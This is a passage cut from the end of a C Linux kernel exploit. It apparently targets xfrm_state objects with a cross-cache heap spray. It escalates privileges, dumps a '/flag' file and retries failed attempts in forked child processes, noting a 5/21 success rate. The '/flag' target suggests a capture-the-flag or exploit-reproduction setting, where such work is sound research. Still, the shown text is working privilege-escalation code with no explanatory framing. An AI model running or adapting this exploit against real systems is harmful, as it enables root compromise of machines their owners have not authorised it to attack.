    LOG("Escalating privs");
    escalate_privs(task, kernel_base);

    dump_file("/flag");

    return EXPLOIT_SUCCESSFUL;
}

int main(int argc, char **argv)
{
    // run_once() has a success probablility of 5/21 to hit a correct slot for the cross-cache spray.
    while(true) {
        LOG("=========== Start exploit attempt ==============");
        int wstatus;

        int pid = fork();
        if (!pid) {
            exit(run_once());
        }

        waitpid(pid, &wstatus, 0);
        if (WIFEXITED(wstatus)) {
            switch(WEXITSTATUS(wstatus)) {
            case EXPLOIT_SUCCESSFUL:
                LOG("=========== Exploit attempt successful =========");
                return 0;
            case EXPLOIT_FAILED:
                LOG("=========== Exploit attempt failed (Retrying) =============");
                // If the attempt was unsuccessful, wait for the worker thread to clean up our xfrm_state objects.
                // @sleep(kernel_func="___xfrm_state_destroy",
                //        desc="Ensure, that garbage collection has run in kworker thread.")
                usleep(1*SECONDS);
                continue;
            }
        }

        LOG("=========== Exploit attempt failed in an unexpected way =============");
        return 1;
    }
}